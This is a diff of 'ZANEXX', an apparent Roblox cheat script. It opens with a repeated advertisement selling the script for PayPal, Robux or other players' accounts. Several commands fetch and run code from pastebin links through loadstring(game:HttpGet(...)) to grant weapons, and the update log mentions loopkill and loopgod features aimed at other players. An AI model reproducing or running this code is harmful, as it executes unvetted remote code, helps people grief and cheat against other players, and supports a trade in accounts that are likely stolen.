+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX  BUY ZANEXX / ACCEPTING - P.PAL 7$ | ROBUX 800 | ACCOUNTS (MUST HAVE ITEMS WORTH OVER 1-2K ROBUX | LIMITEDS 800 - 1200 VALUE \ BUY ZANEXX 
+      ]]..msg)
+      end)
+
+
 
 
 
@@ -1362,48 +1703,48 @@ end
   
   
   Zanexx("Tools", "Sends A LocalPlayer Message With All The Knife Abilities", function(args)
-  SendM("-Tesla", Color3.fromRGB(0, 55, 240))
-  SendM("-Illum", Color3.fromRGB(0, 55, 240))
-  SendM("-Quick", Color3.fromRGB(0, 55, 240))
-  SendM("-Laser", Color3.fromRGB(0, 55, 240))
-  SendM("-Yt", Color3.fromRGB(0, 55, 240))
-  SendM("-Norelgun", Color3.fromRGB(0, 55, 240))
+  SendM("-Tesla", Color3.fromRGB(150, 122, 150))
+  SendM("-Illum", Color3.fromRGB(150, 122, 150))
+  SendM("-Quick", Color3.fromRGB(150, 122, 150))
+  SendM("-Laser", Color3.fromRGB(150, 122, 150))
+  SendM("-Yt", Color3.fromRGB(150, 122, 150))
+  SendM("-Norelgun", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("norelgun", "Gives The LocalPlayer A No-Reload Gun", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/nVy1rVNP'),true))()
-  SendM("[ZANEXX LCM]: No-Reload Gun Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: No-Reload Gun Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("illum", "Gives The LocalPlayer A Knife With The Illuminati Ability", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/8Ag2jaCD'),true))()
-  SendM("[ZANEXX LCM]: Illuminati Knife Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Illuminati Knife Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("Quick", "Gives The LocalPlayer A Knife With The Quickscoper Ability", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/Sn1SsSCi'),true))()
-  SendM("[ZANEXX LCM]: Quickscoper Knife Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Quickscoper Knife Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("Laser", "Gives The LocalPlayer A Knife With The Laser Ability", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/aavyXdmC'),true))()
-  SendM("[ZANEXX LCM]: Laser Knife Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Laser Knife Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("Tesla", "Gives The LocalPlayer A Knife With The Tesla Ability", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/CdUMRVmq'),true))()
-  SendM("[ZANEXX LCM]: Tesla Knife Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Tesla Knife Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
   Zanexx("Yt", "Gives The LocalPlayer A Knife With The Youtube Power Ability", function(args)
   loadstring(game:HttpGet(('https://pastebin.com/raw/CSaF8Szi'),true))()
-  SendM("[ZANEXX LCM]: Youtube Power Knife Loaded", Color3.fromRGB(0, 55, 240))
+  SendM("[ZANEXX LCM]: Youtube Power Knife Loaded", Color3.fromRGB(150, 122, 150))
   end)
   
   
@@ -1429,13 +1770,10 @@ end
   
   wait(1)
   
-  SendM("ZANEXX UPDATE-LOG -", Color3.fromRGB(0, 55, 240))
-  SendM("- 08/16 Added (brl [plr])", Color3.fromRGB(0, 55, 240))
-  SendM("- 08/17 Updated Loopgod", Color3.fromRGB(0, 55, 240))
-  SendM("- 08/17 Updated Loopkill (idk if i can make it better fuck off xD)", Color3.fromRGB(0, 55, 240))
-  SendM("- 08/20 Updated FE-Controller (Now Shows The Player Names)", Color3.fromRGB(0, 55, 240))
-  SendM("- 08/20 ZANEXX V2 Coming Soon???? O_O", Color3.fromRGB(0, 55, 240))
-  
+  SendM("ZANEXX UPDATE-LOG -", Color3.fromRGB(150, 122, 150))
+  SendM("- 08/20 Updated FE-Controller (Now Shows The Player Names)", Color3.fromRGB(150, 122, 150))
+  SendM("- 08/21 ZANEXX V2 Coming Soon???? O_O", Color3.fromRGB(150, 122, 150))
+  SendM("- 08/21 Updated Loopgod (dont spam it)", Color3.fromRGB(150, 122, 150))
   
 game:GetService("TestService"):Message('Successfully loaded')
 game:GetService("TestService"):Message('Created by Zack || exclusiveclique || exclusiveclique#1444')
